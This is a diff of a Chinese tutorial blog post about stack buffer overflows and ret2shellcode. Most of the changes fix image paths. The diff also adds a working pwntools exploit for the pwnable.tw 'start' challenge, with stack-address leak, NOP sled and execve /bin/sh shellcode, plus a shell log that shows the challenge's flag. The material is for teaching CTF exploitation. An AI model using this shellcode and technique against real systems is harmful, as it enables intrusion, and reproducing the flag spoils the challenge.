@@ -89,7 +89,7 @@ gdb 反汇编语法设置默认为 AT&T 语法改为 Intel 语法
 
 这里说的栈与数据结构的栈略微有些区别这里的栈是指程序在运行时在内存中开辟的一块区域称为运行时栈数据存储规则同样为 FILO(First in Last out 先进后出)。操作简单只有push压栈和 pop 弹栈。例如push eax代表将 eax 寄存器中的值压入栈顶寄存器 -> 内存pop eax代表将栈顶的值取出放到 eax 寄存器中 内存 -> 寄存器。
 
-![push_pop](images/2018-08-16-StackOverFlow之Ret2ShellCode详解/push_pop.png)
+![push_pop](../images/2018-08-16-StackOverFlow之Ret2ShellCode详解/push_pop.png)
 
  上图表示 push 和 pop 操作栈中数值的变化**注意栈的生长方向是高地址到低地址** push eax 第一步将 esp – 4 中使 esp 重新指向栈顶 一个单位栈空间占据4字节第二步将 eax 中的值放入栈顶同理 push ebx 第一步使 esp 继续减 4 中使 esp 指向新的栈顶 第二步将 ebx 中的值放入栈顶 。pop ebx 第一步将栈顶的值传入 ebx 中第二步使 esp + 4 使其指向新的栈顶。push 和 pop 操作动作相反。 
 
@@ -176,7 +176,7 @@ main()函数中调用fun()函数并传值a、b汇编指令对应如下:
 
 从上面可以看出函数参数入栈的顺序和我们正常C语言的调用顺序是反着的即**参数逆序入栈。**这里还有一点就是在调用一个函数前都是先压入参数(没有参数就不用)然后再调用函数汇编表现为 push xxx ; push xxx; push xxx; call xxx的形式。当然这根据不同的**调用约定**有关参考 [这里](http://www.cnblogs.com/clover-toeic/p/3755401.html)。什么是调用约定这关系到另外一个问题当一个函数被调用完时它之前所开辟的栈空间到底怎么处理有两种方式第一种就是掉用者清理这种方式成为 **cdecl 调用约定**此约定也是 c/c++ 缺省的调用方式第二种就是被调用者清理栈空间这种称为 **stdcall 调用约定** windows程序开发时大多使用这种调用方式。**stdcall** 调用约定还有个升级版 **fastcall** 调用约定与 **stdcall** **调用约定** 不同的是如果被调用者只有至多两个参数则通过寄存器传参超过两个参数的部分则还是以栈的形式传参。不管他们哪种调用约定参数都是以逆序的方式入栈。接下来就是图解栈的调用
 
-![stackframe](images/2018-08-16-StackOverFlow之Ret2ShellCode详解/stackframe.png)
+![stackframe](../images/2018-08-16-StackOverFlow之Ret2ShellCode详解/stackframe.png)
 
 被忽略掉的五条指令中前两条不用管后面三条就是
 
@@ -315,23 +315,82 @@ int main()
 
 在调用 sys_write() 之前栈帧情况
 
-![stack1](images/2018-08-16-StackOverFlow之Ret2ShellCode详解/stack1.png)
+![stack1](../images/2018-08-16-StackOverFlow之Ret2ShellCode详解/stack1.png)
 
 蓝色就是buf部分执行sys_read函数时esp 还是指向此地 输入的内容重新覆盖这块缓冲区超出的部分继续向下覆盖。因为ret_addr保存的是exit函数的地址正常返回的话是直接退出程序现在需要控制这个地址使其返回到我们想要去的地方。利用 **mov  ecx,esp** 指令可以得到此时栈的地址。sys_read() 后 add esp,0×14 执行完后栈帧情况
 
-![stack2](images/2018-08-16-StackOverFlow之Ret2ShellCode详解/stack2.png)
+![stack2](../images/2018-08-16-StackOverFlow之Ret2ShellCode详解/stack2.png)
 
  紧接着就要执行 ret 指令eip 就被修改为 0x804809d而esp – 4指向了程序最开始保存的 esp值也就是栈的基址如图 
 
-![stack3](images/2018-08-16-StackOverFlow之Ret2ShellCode详解/stack3.png)
+![stack3](../images/2018-08-16-StackOverFlow之Ret2ShellCode详解/stack3.png)
 
 试想如果此时将 ret_addr 改成了刚刚所说的 mov ecx,esp 指令处程序就又会继续执行sys_write() 而此时的参数为 sys_write(1,esp,20) 这样一来程序就会输出 esp 指向的地址处的内容而此内存区域刚好存放着保存的 esp 值。这就泄露出了栈的地址有了栈的地址才能在栈上布置 shellcode。
 
 程序继续执行到了 sys_read() 这时便是构造 payload 的时候了只不过此时 esp 指向的是栈底输入的内容机会从现在的位置开始覆盖输入最大为60字节。如图:
 
-![stack4](images/2018-08-16-StackOverFlow之Ret2ShellCode详解/stack4.png)
+![stack4](../images/2018-08-16-StackOverFlow之Ret2ShellCode详解/stack4.png)
 
  执行完sys_read()函数之后还需执行 add esp,0×14 所以 shellcode 能放的地方也只有剩下的40字节但也足够了。 
 
-![stack5](images/2018-08-16-StackOverFlow之Ret2ShellCode详解/stack5.png)
+![stack5](../images/2018-08-16-StackOverFlow之Ret2ShellCode详解/stack5.png)
 
+所以 shellcode 的起始地址为 esp+20,之前的部分可任意填充除 ’\x00‘ (会造成截断)之外的内容。exp如下:
+
+```
+from pwn import *
+
+#context.log_level = 'debug'
+
+debug = 0
+
+if debug:
+	sh = process('./start')
+else:
+	sh = remote('chall.pwnable.tw',10000)
+
+def leak_stack_addr():
+	sh.recvuntil(':')
+	payload = 'a' * 20 + p32(0x08048087)
+	sh.send(payload)
+	stack_addr = sh.recv(4)
+	return u32(stack_addr)
+
+def pwn(addr):
+	nopsled = '\x90' * 10
+	shellcode ='\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'
+	payload = 'a' * 20 + p32(addr + 20) + nopsled + shellcode
+	sh.send(payload)
+	sh.interactive() 
+
+pwn(leak_stack_addr())
+```
+
+需要注意的是exp里有 nopsled 这是因为程序在实际运行过程中可能跟计算出来的地址有所偏差而nop指令代表着什么都不做就像滑雪橇一样一直划到 shellcode中 nopsled 因此而得名机器码转义为’\x90′所以在 shellcode 增加一段nops指令不仅无影响还能增强 exp 的可移植性。shellcode 可以在[这里面](http://shell-storm.org/shellcode/)去找只要不超过缓冲区限制就行。
+
+获得 flag
+
+```
+⚡ root@kali  ~/Desktop  python pwnabletw/start/exp_start.py
+[+] Opening connection to chall.pwnable.tw on port 10000: Done
+[*] Switching to interactive mode
+\x00\x00\x006\x7f\xa2\xff\x00\x00\x00\x00H\x7f\xa2\xff$find / -name flag
+/home/start/flag
+$ cat /home/start/flag
+FLAG{Pwn4bl3_tW_1s_y0ur_st4rt}
+$  
+```
+
+## **0×08 练习网址**
+
+> [pwnable.tw](https://pwnable.tw/)
+>
+> [pwnable.kr](http://pwnable.kr/)
+>
+> [exploit-exercise](https://exploit-exercises.com/) 提供虚拟机镜像，难度区分度大，适合新手
+
+## **0×09 参考**
+
+> [ctf-wiki](https://ctf-wiki.github.io/ctf-wiki/)
+>
+> [一步一步学rop蒸米](http://wooyun.jozxing.cc/search?keywords=一步一步学rop&content_search_by=by_drops)
